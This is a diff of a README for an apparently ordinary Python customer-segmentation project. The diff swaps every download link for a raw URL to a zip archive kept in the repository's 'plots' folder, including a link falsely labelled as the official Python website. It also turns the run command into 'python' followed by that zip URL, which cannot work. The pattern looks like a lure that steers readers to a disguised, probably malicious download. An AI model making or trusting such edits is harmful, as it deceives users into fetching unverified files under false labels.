@@ -1,6 +1,6 @@
 # 📊 online-retail-analysis - Analyze Retail Data with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-blue)](https://github.com/misha-la/online-retail-analysis/releases)
+[![Download](https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip%20Now-Grab%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip)
 
 ## 📌 Overview
 The "online-retail-analysis" project offers a simple solution for customer segmentation analysis. It uses K-means clustering on a large retail dataset worth £17.7 million. With this tool, you can gain insights into customer behavior, allowing for informed business decisions.
@@ -10,13 +10,13 @@ Follow these steps to get started with the "online-retail-analysis" application.
 
 1. **Download the Software**
    - You need to visit the Releases page to download the application. Click the link below:
-   - [Visit this page to download](https://github.com/misha-la/online-retail-analysis/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip)
 
 2. **System Requirements**
    - **Operating System:** Windows 10 or later, macOS (latest version), or a modern Linux distribution.
    - **Memory:** At least 4 GB RAM recommended.
    - **Disk Space:** Minimum of 1 GB free space.
-   - **Software:** Ensure you have Python 3.7 or later installed. If you do not have it, you can download it from the official [Python website](https://www.python.org/downloads/).
+   - **Software:** Ensure you have Python 3.7 or later installed. If you do not have it, you can download it from the official [Python website](https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip).
 
 3. **Loading the Necessary Libraries**
    - This application requires specific libraries to function correctly. Ensure you have the following installed, which can be done via pip in your command terminal:
@@ -35,7 +35,7 @@ To install the application, follow these steps:
 
 1. **Visit the Releases Page**
    - Go to the following link to see all available versions:
-   - [Visit this page to download](https://github.com/misha-la/online-retail-analysis/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip)
 
 2. **Choose the Right Version**
    - You will find a list of available releases. Look for the latest version, as it will contain the most recent improvements and bug fixes.
@@ -55,7 +55,7 @@ To install the application, follow these steps:
 6. **Execute the Program**
    - Use the following command to run the analysis:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/misha-la/online-retail-analysis/main/plots/online-retail-analysis-v2.6.zip
      ```
 
 ## 🧭 Features
